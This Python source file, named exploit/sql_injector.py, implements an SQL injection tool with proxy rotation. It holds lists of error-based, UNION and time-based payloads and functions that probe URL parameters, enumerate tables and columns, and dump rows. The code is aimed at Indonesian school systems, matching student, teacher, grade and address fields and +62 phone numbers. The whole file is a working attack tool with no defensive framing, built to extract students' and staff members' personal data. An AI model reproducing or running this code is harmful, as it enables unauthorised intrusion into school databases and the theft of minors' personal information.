# exploit/sql_injector.py
import requests
import time
import re
from urllib.parse import urlencode, parse_qs, urlparse, urlunparse

class SQLInjector:
    def __init__(self, proxy_rotator=None):
        self.session = requests.Session()
        self.proxy_rotator = proxy_rotator
        
        # SQL injection payloads
        self.error_based_payloads = [
            "'",
            "''",
            "`",
            "\"",
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "' OR 1=1--",
            "\" OR \"1\"=\"1",
            "' OR 'a'='a",
            "' OR 1=1 LIMIT 1--"
        ]
        
        self.union_payloads = [
            "' UNION SELECT null--",
            "' UNION SELECT null,null--",
            "' UNION SELECT null,null,null--",
            "' UNION SELECT 1--",
            "' UNION SELECT 1,2--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT @@version--",
            "' UNION SELECT database()--",
            "' UNION SELECT user()--"
        ]
        
        self.time_based_payloads = [
            "' AND SLEEP(5)--",
            "' AND SLEEP(5) AND '1'='1",
            "' AND SLEEP(5) AND '",
            "'; WAITFOR DELAY '00:00:05'--",
            "' OR SLEEP(5) AND 'a'='a"
        ]
    
    def test_parameter(self, url, parameter):
        """Test a parameter for SQL injection vulnerability"""
        
        # Test for error-based SQLi
        for payload in self.error_based_payloads:
            test_url = self.inject_payload(url, parameter, payload)
            
            try:
                response = self.session.get(test_url, timeout=10)
                
                # Check for SQL error messages
                error_indicators = [
                    'sql', 'mysql', 'database', 'syntax',
                    'error', 'warning', 'exception',
                    'unclosed', 'quote', 'where',
                    'you have an error', 'invalid query'
                ]
                
                response_text = response.text.lower()
                if any(indicator in response_text for indicator in error_indicators):
                    return True
                    
            except:
                pass
        
        # Test for time-based SQLi
        for payload in self.time_based_payloads[:2]:  # Limit to 2 to save time
            test_url = self.inject_payload(url, parameter, payload)
            
            try:
                start_time = time.time()
                response = self.session.get(test_url, timeout=15)
                elapsed = time.time() - start_time
                
                if elapsed > 4:  # If response took more than 4 seconds
                    return True
                    
            except:
                pass
        
        return False
    
    def inject_payload(self, url, parameter, payload):
        """Inject payload into URL parameter"""
        parsed = urlparse(url)
        query_dict = parse_qs(parsed.query)
        
        # Add or replace parameter with payload
        query_dict[parameter] = payload
        
        # Rebuild URL
        new_query = urlencode(query_dict, doseq=True)
        new_url = urlunparse((
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            parsed.params,
            new_query,
            parsed.fragment
        ))
        
        return new_url
    
    def get_database_info(self, url, parameter):
        """Get database information using SQL injection"""
        info = {}
        
        # Test for version
        version_payloads = [
            f"' UNION SELECT @@version,null--",
            f"' UNION SELECT version(),null--",
            f"' UNION SELECT null,@@version--"
        ]
        
        for payload in version_payloads:
            test_url = self.inject_payload(url, parameter, payload)
            
            try:
                response = self.session.get(test_url, timeout=10)
                
                # Try to extract version from response
                version_patterns = [
                    r'(\d+\.\d+\.\d+[^\s<>&"]*)',  # MySQL/PostgreSQL version
                    r'(\d+\.\d+[^\s<>&"]*)',       # SQL Server version
                    r'(\d+[^\s<>&"]*)'             # Simple version
                ]
                
                for pattern in version_patterns:
                    match = re.search(pattern, response.text)
                    if match:
                        info['version'] = match.group(1)
                        break
                
                if 'version' in info:
                    break
                    
            except:
                pass
        
        # Test for database name
        db_payloads = [
            f"' UNION SELECT database(),null--",
            f"' UNION SELECT null,database()--"
        ]
        
        for payload in db_payloads:
            test_url = self.inject_payload(url, parameter, payload)
            
            try:
                response = self.session.get(test_url, timeout=10)
                
                # Look for potential database name
                # Often appears near SELECT or UNION in error messages
                lines = response.text.split('\n')
                for line in lines:
                    if 'select' in line.lower() or 'union' in line.lower():
                        # Extract potential database name
                        words = re.findall(r'\b\w+\b', line)
                        for word in words:
                            if len(word) > 3 and word.isalnum():
                                # Common database name patterns for schools
                                if any(pattern in word.lower() for pattern in [
                                    'db', 'data', 'sis', 'sek', 'skl'
                                ]):
                                    info['database'] = word
                                    break
                
                if 'database' in info:
                    break
                    
            except:
                pass
        
        return info
    
    def get_tables(self, url, parameter):
        """Extract table names from database"""
        tables = []
        
        # Payloads for different database types
        table_payloads = [
            # MySQL
            f"' UNION SELECT table_name,null FROM information_schema.tables--",
            f"' UNION SELECT null,table_name FROM information_schema.tables--",
            
            # PostgreSQL
            f"' UNION SELECT tablename,null FROM pg_tables--",
            
            # SQL Server
            f"' UNION SELECT table_name,null FROM information_schema.tables--"
        ]
        
        for payload in table_payloads:
            test_url = self.inject_payload(url, parameter, payload)
            
            try:
                response = self.session.get(test_url, timeout=10)
                
                # Extract table names from response
                # Look for words that might be table names
                potential_tables = re.findall(r'\b\w+\b', response.text)
                
                for table in potential_tables:
                    table_lower = table.lower()
                    # Filter for likely table names
                    if (len(table) > 3 and 
                        table.isalnum() and 
                        not table.isdigit() and
                        not table_lower.startswith('http') and
                        not table_lower.endswith(('.jpg', '.png', '.css', '.js'))):
                        
                        # Check if it looks like a database table name
                        if any(pattern in table_lower for pattern in [
                            'tbl', 'table', 'tb_', '_tbl',
                            'siswa', 'student', 'guru', 'teacher',
                            'nilai', 'grade', 'kelas', 'class',
                            'user', 'admin', 'login', 'account'
                        ]):
                            tables.append(table)
                
                if tables:
                    break
                    
            except:
                pass
        
        # Remove duplicates and limit
        tables = list(set(tables))[:50]
        return tables
    
    def dump_table(self, url, parameter, table_name, limit=100):
        """Dump data from a specific table"""
        data = []
        
        # First, get column names
        column_payloads = [
            # MySQL
            f"' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='{table_name}'--",
            f"' UNION SELECT null,column_name FROM information_schema.columns WHERE table_name='{table_name}'--",
            
            # Try to guess columns for school tables
            f"' UNION SELECT 'nisn','nama' FROM {table_name}--",
            f"' UNION SELECT 'nama','alamat' FROM {table_name}--"
        ]
        
        columns = []
        for payload in column_payloads:
            test_url = self.inject_payload(url, parameter, payload)
            
            try:
                response = self.session.get(test_url, timeout=10)
                
                # Extract column names
                words = re.findall(r'\b\w+\b', response.text)
                for word in words:
                    word_lower = word.lower()
                    if (len(word) > 2 and
                        word.isalnum() and
                        any(pattern in word_lower for pattern in [
                            'nama', 'name', 'alamat', 'address',
                            'nis', 'nisn', 'id', 'no', 'nik',
                            'telp', 'phone', 'email', 'kelas',
                            'class', 'jurusan', 'major', 'nilai',
                            'grade', 'tanggal', 'date', 'tahun'
                        ])):
                        columns.append(word)
                
                if columns:
                    columns = list(set(columns))[:5]  # Limit to 5 columns
                    break
                    
            except:
                pass
        
        # If we couldn't get column names, use generic ones
        if not columns:
            columns = ['col1', 'col2', 'col3']
        
        # Build SELECT query with column names
        columns_str = ','.join(columns[:3])  # Limit to 3 columns
        
        # Try to extract data
        for i in range(0, limit, 10):
            data_payload = f"' UNION SELECT {columns_str} FROM {table_name} LIMIT {i},10--"
            test_url = self.inject_payload(url, parameter, data_payload)
            
            try:
                response = self.session.get(test_url, timeout=10)
                
                # Parse response for data
                # This is simplified - real implementation would need proper parsing
                lines = response.text.split('\n')
                for line in lines:
                    # Look for data patterns
                    if any(indicator in line.lower() for indicator in [
                        '@', '.com', '.id', '08', '+62', 'jl.', 'jalan',
                        'sma', 'smp', 'sd', 'xi', 'xii', 'ipa', 'ips'
                    ]):
                        # Extract potential data
                        cells = re.findall(r'>([^<]+)<', line)
                        for cell in cells:
                            cell = cell.strip()
                            if cell and len(cell) > 1:
                                # Create row data
                                row = {}
                                for j, col in enumerate(columns[:len(cells)]):
                                    if j < len(cells):
                                        row[col] = cells[j]
                                if row:
                                    data.append(row)
                
                # Small delay
                time.sleep(0.3)
                
            except:
                break
        
        return data[:limit]  # Return limited data
